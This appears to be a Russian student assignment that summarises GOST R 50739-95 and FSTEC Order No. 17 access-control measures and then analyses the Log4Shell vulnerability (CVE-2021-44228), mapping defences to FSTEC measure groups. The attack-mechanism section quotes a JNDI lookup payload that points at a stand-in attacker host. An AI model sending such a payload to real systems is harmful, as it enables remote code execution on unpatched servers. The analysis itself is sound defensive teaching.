# ПР №2. Нормативная база и анализ CVE

## 1. Нормативные документы

### ГОСТ Р 50739-95

- Область применения: средства вычислительной техники, защита от несанкционированного доступа к информации
- Количество классов защищённости: 7 классов (от 7-го — минимального до 1-го — максимального)
- Что регулирует управление доступом: разграничение доступа субъектов к объектам по правилам дискреционного и мандатного принципов

### Приказ ФСТЭК №17

- Кому адресован: операторам государственных информационных систем (ГИС)
- Группа мер УПД включает:
  - УПД.1 — управление учётными записями пользователей
  - УПД.2 — реализация необходимых методов управления доступом
  - УПД.3 — управление правами пользователей в ИС
  - УПД.4 — разделение полномочий (ролей) пользователей

> **Отличие ГИС от ИСПДн:** Приказ №17 регулирует государственные информационные системы (ГИС), а Приказ №21 — информационные системы персональных данных (ИСПДн). ГИС классифицируются по классам К1–К3, ИСПДн — по уровням защищённости УЗ1–УЗ4.

## 2. Анализ уязвимости

**CVE-идентификатор:** CVE-2021-44228

**CVSS Score:** 10.0 (Критический)

**Затронутый продукт:** Apache Log4j 2 (версии 2.0-beta9 до 2.14.1)

### Описание

Уязвимость в библиотеке логирования Log4j 2 для Java позволяет злоумышленнику выполнить произвольный код на сервере без какой-либо аутентификации. Достаточно передать специально сформированную строку, которую приложение запишет в лог.

### Механизм атаки

Злоумышленник отправляет HTTP-запрос со строкой вида `${jndi:ldap://attacker.com/exploit}` в любом поле (заголовке, параметре). Log4j обрабатывает эту строку как команду и обращается к серверу злоумышленника по протоколу JNDI/LDAP, после чего загружает и выполняет вредоносный Java-класс. Аутентификация не требуется (AV:N, PR:N).

### Применимые меры защиты по Приказу ФСТЭК №17

| Группа мер | Мера | Как помогает |
|------------|------|-------------|
| ОПС | Контроль состава и целостности ПО | Своевременное обновление Log4j до версии 2.15.0+ устраняет уязвимость |
| ЗИС | Защита от сетевых атак | Блокировка исходящих LDAP/RMI соединений с сервера предотвращает загрузку вредоносного кода |
| АНЗ | Анализ защищённости | Сканирование компонентов приложения позволяет обнаружить уязвимую версию Log4j |
| УПД | Минимизация привилегий | Запуск приложений с минимальными правами ограничивает ущерб при эксплуатации |

## 3. Выводы

Уязвимость Log4Shell (CVE-2021-44228) наглядно демонстрирует, как уязвимость в стороннем компоненте может критически влиять на безопасность всей системы. Требования Приказа ФСТЭК №17 в части управления программным обеспечением (ОПС) и защиты информационной системы (ЗИС) напрямую направлены на предотвращение подобных инцидентов. Регулярный анализ используемых компонентов и своевременное обновление ПО являются ключевыми мерами защиты.
